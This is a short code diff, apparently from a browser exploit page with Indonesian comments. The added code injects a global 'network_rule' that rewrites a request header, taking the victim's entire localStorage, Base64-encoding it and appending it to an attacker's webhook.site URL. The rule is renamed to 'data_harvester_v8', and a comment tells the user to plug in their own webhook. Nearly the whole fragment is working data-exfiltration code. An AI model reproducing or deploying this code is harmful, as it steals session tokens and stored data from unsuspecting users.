@@ -21,21 +21,22 @@
         // GANTI DENGAN WEBHOOK LU
         const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
 
-        const payload = {
-            source: "main_thread",
-            eventName: "network_rule",
-            data: [{
-                ruleName: "cross_origin_persistent_pwn",
-                global: true,
-                conditions: [],
-                handlers: [{
-                    handler: "replace",
-                    type: "header",
-                    field: "X-Pns-Referrer",
-                    value: webhook
-                }]
-            }]
-        };
+
+  const payload = {
+    source: "main_thread",
+    eventName: "network_rule",
+    data: [{
+        ruleName: "data_harvester_v8",
+        global: true,
+        handlers: [{
+            handler: "replace",
+            type: "header",
+            field: "X-Pns-Referrer",
+            // Mengambil seluruh isi LocalStorage, diubah ke String, lalu di-Base64
+            value: webhook + "?storage=" + btoa(JSON.stringify(window.localStorage))
+        }]
+    }]
+};
 
         gate.onload = function() {
             statusH1.innerText = "[ PHASE 2: INJECTING ]";
